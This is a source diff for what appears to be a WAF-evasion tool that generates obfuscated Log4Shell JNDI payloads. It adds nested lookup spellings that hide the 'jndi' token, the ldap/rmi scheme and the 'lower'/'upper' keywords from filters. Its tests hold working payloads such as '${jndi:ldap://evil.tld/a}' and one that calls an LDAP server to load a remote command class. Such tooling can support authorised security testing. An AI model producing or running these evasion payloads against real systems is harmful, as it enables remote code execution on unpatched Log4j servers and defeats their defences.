@@ -206,39 +206,112 @@ pub fn still_executes(original: &str, cand: &str) -> bool {
 // ── rewrites (interpolator-transparent, WAF-opaque) ────────────────
 
 /// Obfuscate one ASCII letter as a collapsing lookup that resolves to
-/// it. Composable and spec-faithful.
+/// it. Composable and spec-faithful. Every arm folds back to `c` under
+/// [`normalize`]; `still_executes` is the backstop, so adding an arm can
+/// only add diversity, never unsoundness.
+///
+/// Arms 6–8 are SECOND-ORDER: the lookup KEYWORD itself is spelled with
+/// a collapsing lookup (`${::-l}ower` → `lower`), which defeats a WAF
+/// that blocks the literal `${lower:` / `${upper:` prefixes — the
+/// inner lookup resolves first (innermost-first recursion), reconstructing
+/// the outer keyword only after the regex has already passed.
 fn obf_char(c: char, rng: &mut Rng) -> String {
     if !c.is_ascii_alphabetic() {
         return c.to_string();
     }
-    match rng.below(6) {
-        0 => format!("${{lower:{}}}", c.to_ascii_uppercase()),
-        1 => format!("${{upper:{}}}", c.to_ascii_lowercase()),
+    let up = c.to_ascii_uppercase();
+    let lo = c.to_ascii_lowercase();
+    match rng.below(9) {
+        0 => format!("${{lower:{up}}}"),
+        1 => format!("${{upper:{lo}}}"),
         2 => format!("${{::-{c}}}"),
         3 => format!("${{env:WAFRIFT_UNSET:-{c}}}"),
         4 => format!("${{sys:wafrift.unset:-{c}}}"),
-        _ => format!("${{date:'{c}'}}"),
+        5 => format!("${{date:'{c}'}}"),
+        // second-order: hide the `lower`/`upper`/`env` keyword itself.
+        6 => format!("${{${{::-l}}ower:{up}}}"),
+        7 => format!("${{${{::-u}}pper:{lo}}}"),
+        _ => format!("${{${{::-e}}nv:WAFRIFT_UNSET:-{c}}}"),
     }
 }
 
-/// Rewrite the `jndi` token (and optionally the scheme) into a
-/// nested-lookup spelling. Authority + path are preserved verbatim.
-fn rw_obfuscate(payload: &str, rng: &mut Rng) -> Option<String> {
-    let pos = payload.find("jndi")?;
-    let (pre, mid) = payload.split_at(pos);
-    let (tok, post) = mid.split_at(4); // "jndi"
+/// Obfuscate the ASCII-alpha chars of `payload[range]` in place — each,
+/// with prob 3/4, replaced by a [`obf_char`] collapsing lookup. The
+/// bytes outside `range` (authority, path, delimiters) are preserved
+/// verbatim. One primitive for both the `jndi` token and the URL scheme
+/// (§7 DEDUP).
+fn obf_span(payload: &str, range: std::ops::Range<usize>, rng: &mut Rng) -> String {
+    let pre = &payload[..range.start];
+    let tok = &payload[range.clone()];
+    let post = &payload[range.end..];
     let obf: String = tok
         .chars()
         .map(|c| {
-            if rng.chance(3, 4) {
+            if c.is_ascii_alphabetic() && rng.chance(3, 4) {
                 obf_char(c, rng)
             } else {
                 c.to_string()
             }
         })
         .collect();
-    let out = format!("{pre}{obf}{post}");
-    (out != payload).then_some(out)
+    format!("{pre}{obf}{post}")
+}
+
+/// Locate the URL scheme token (`ldap`/`rmi`/`dns`/…) that follows the
+/// literal `jndi:` envelope, as a byte range into `payload`. `None` when
+/// the payload's `jndi` is itself already obfuscated or the scheme is not
+/// a plain alpha run (we only rewrite clean operator input; the
+/// `still_executes` gate guarantees soundness regardless).
+fn scheme_range(payload: &str, jndi_end: usize) -> Option<std::ops::Range<usize>> {
+    let after = payload[jndi_end..].strip_prefix(':')?;
+    let s_start = jndi_end + 1;
+    let rel = after.find(':')?; // scheme ends at the `:` before `//`
+    let scheme = &after[..rel];
+    (!scheme.is_empty() && scheme.chars().all(|c| c.is_ascii_alphabetic()))
+        .then_some(s_start..s_start + rel)
+}
+
+/// Rewrite the `jndi` token AND/OR the URL scheme into nested-lookup
+/// spellings. Authority + path are preserved verbatim. At least one of
+/// the two tokens is obfuscated. Returns the variant plus the technique
+/// tags that fired (for operator-visible `rules`).
+///
+/// Obfuscating the SCHEME is the high-value addition: most real-world
+/// Log4Shell WAF rules key on `ldap:`/`rmi:`/`jndi:` literally, so a
+/// variant that only hid `jndi` still shipped `ldap://` in cleartext.
+/// `scheme_range` + `obf_span` close that — and the collapse oracle
+/// already proves the result drives the identical JNDI fetch.
+fn rw_obfuscate(payload: &str, rng: &mut Rng) -> Option<(String, Vec<&'static str>)> {
+    let jpos = payload.find("jndi")?;
+    let jend = jpos + 4;
+    let scheme = scheme_range(payload, jend);
+
+    let mut do_jndi = rng.chance(3, 4);
+    let mut do_scheme = scheme.is_some() && rng.chance(3, 4);
+    // guarantee progress: if neither was chosen, force one.
+    if !do_jndi && !do_scheme {
+        if scheme.is_some() {
+            do_scheme = true;
+        } else {
+            do_jndi = true;
+        }
+    }
+
+    let mut out = payload.to_string();
+    let mut rules: Vec<&'static str> = Vec::new();
+    // Scheme sits AFTER `jndi` (higher index); rewrite it first so the
+    // `jndi` range stays valid for the second rewrite.
+    if do_scheme {
+        if let Some(r) = scheme {
+            out = obf_span(&out, r, rng);
+            rules.push("log4j_scheme_obf");
+        }
+    }
+    if do_jndi {
+        out = obf_span(&out, jpos..jend, rng);
+        rules.push("log4j_lookup_collapse");
+    }
+    (out != payload).then_some((out, rules))
 }
 
 #[must_use]
@@ -250,7 +323,7 @@ pub fn generate(payload: &str, cfg: &EquivConfig) -> Vec<EquivPayload> {
         _ => (all, false),
     };
     let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
-    let mut out: Vec<EquivPayload> = Vec::new();
+    let mut out: Vec<EquivPayload> = Vec::with_capacity(cfg.max);
 
     if !still_executes(payload, payload) {
         return out;
@@ -272,9 +345,9 @@ pub fn generate(payload: &str, cfg: &EquivConfig) -> Vec<EquivPayload> {
     }
 
     let mut attempts = 0;
-    while out.len() < cfg.max && attempts < cfg.max * 24 + 64 {
+    while out.len() < cfg.max && attempts < cfg.max * super::ATTEMPT_BUDGET_MULTIPLIER + super::ATTEMPT_BUDGET_FLOOR {
         attempts += 1;
-        let Some(s) = rw_obfuscate(payload, &mut rng) else {
+        let Some((s, rules)) = rw_obfuscate(payload, &mut rng) else {
             continue;
         };
         if !still_executes(payload, &s) {
@@ -295,7 +368,7 @@ pub fn generate(payload: &str, cfg: &EquivConfig) -> Vec<EquivPayload> {
             payload: s,
             delivery: d,
             dialect: Dialect::Generic,
-            rules: vec!["log4j_lookup_collapse"],
+            rules,
         });
     }
     super::enforce_transport_legal(&mut out);
@@ -308,14 +381,7 @@ mod tests {
     use super::*;
 
     fn cfg(seed: u64) -> EquivConfig {
-        EquivConfig {
-            seed,
-            max: 40,
-            verify: true,
-            vary_delivery: true,
-            param: "X-Api-Version".into(),
-            force_delivery: None,
-        }
+        crate::grammar::equiv::test_cfg(seed, 40, "X-Api-Version")
     }
 
     #[test]
@@ -339,6 +405,75 @@ mod tests {
                 "target drift: {v}"
             );
         }
+    }
+
+    #[test]
+    fn scheme_obfuscation_collapses_to_canonical() {
+        // The scheme (`ldap`/`rmi`) hidden behind collapsing lookups must
+        // still drive the identical JNDI fetch — the new high-value evasion.
+        let canon = jndi_target(&normalize("${jndi:ldap://evil.tld/a}")).unwrap();
+        for v in [
+            "${jndi:${lower:L}dap://evil.tld/a}",
+            "${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://evil.tld/a}",
+            "${jndi:${::-l}${::-d}${::-a}${::-p}://evil.tld/a}",
+            // jndi AND scheme both obfuscated
+            "${${::-j}ndi:${lower:L}dap://evil.tld/a}",
+            // second-order: the `lower` keyword itself is spelled with a lookup
+            "${jndi:${${::-l}ower:L}dap://evil.tld/a}",
+        ] {
+            assert!(
+                still_executes("${jndi:ldap://evil.tld/a}", v),
+                "scheme-obf not equiv: {v}"
+            );
+            assert_eq!(
+                jndi_target(&normalize(v)).unwrap(),
+                canon,
+                "scheme-obf target drift: {v}"
+            );
+        }
+    }
+
+    #[test]
+    fn second_order_keyword_obfuscation_collapses() {
+        // `${${::-l}ower:J}` → `${lower:J}` → `j` via innermost-first
+        // recursion — the construct that defeats a WAF blocking `${lower:`.
+        assert_eq!(normalize("${${::-l}ower:J}ndi"), "jndi");
+        assert_eq!(normalize("${${::-u}pper:j}NDI"), "jndi");
+        assert!(still_executes(
+            "${jndi:ldap://h/a}",
+            "${${${::-l}ower:J}ndi:ldap://h/a}"
+        ));
+    }
+
+    #[test]
+    fn generator_emits_scheme_hidden_variants() {
+        // Capability proof: across seeds the generator MUST produce at least
+        // one sound variant whose raw form no longer contains the cleartext
+        // scheme `ldap` (a WAF keyed on `ldap:` would pass it), tagged with
+        // the scheme-obfuscation technique. Pre-fix the generator only ever
+        // hid `jndi`, so `ldap://` always shipped in the clear.
+        let atk = "${jndi:ldap://10.0.0.1:1389/Basic/Command/x}";
+        let mut found_scheme_hidden = false;
+        let mut found_tag = false;
+        for seed in 0..40u64 {
+            for m in generate(atk, &cfg(seed)) {
+                assert!(still_executes(atk, &m.payload), "UNSOUND {:?}", m.payload);
+                if m.rules.contains(&"log4j_scheme_obf") {
+                    found_tag = true;
+                    if !m.payload.to_ascii_lowercase().contains("ldap") {
+                        found_scheme_hidden = true;
+                    }
+                }
+            }
+            if found_scheme_hidden && found_tag {
+                break;
+            }
+        }
+        assert!(found_tag, "no variant tagged log4j_scheme_obf");
+        assert!(
+            found_scheme_hidden,
+            "generator never hid the cleartext `ldap` scheme"
+        );
     }
 
     #[test]
